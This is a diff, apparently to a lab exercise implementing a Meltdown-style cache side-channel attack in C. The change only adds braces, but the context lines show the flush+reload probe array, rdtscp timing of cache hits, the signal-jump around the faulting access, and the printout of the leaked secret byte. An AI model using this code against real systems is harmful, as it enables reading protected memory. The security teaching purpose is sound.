@@ -20,11 +20,15 @@ void flushSideChannel()
 
   // Write to array to bring it to RAM to prevent Copy-on-write
   for (i = 0; i < 256; i++)
+  {
     array[i * 4096 + DELTA] = 1;
+  }
 
   //flush the values of the array from cache
   for (i = 0; i < 256; i++)
+  {
     _mm_clflush(&array[i * 4096 + DELTA]);
+  }
 }
 
 static int scores[256];
@@ -42,7 +46,9 @@ void reloadSideChannelImproved()
     junk = *addr;
     time2 = __rdtscp(&junk) - time1;
     if (time2 <= CACHE_HIT_THRESHOLD)
+    {
       scores[i]++; /* if cache hit, add 1 for this value */
+    }
   }
 }
 
@@ -103,7 +109,9 @@ int main()
 
     // Flush the probing array
     for (j = 0; j < 256; j++)
+    {
       _mm_clflush(&array[j * 4096 + DELTA]);
+    }
 
     if (sigsetjmp(jbuf, 1) == 0)
     {
@@ -118,7 +126,9 @@ int main()
   for (i = 0; i < 256; i++)
   {
     if (scores[max] < scores[i])
+    {
       max = i;
+    }
   }
 
   printf("The secret value is %d %c\n", max, max);
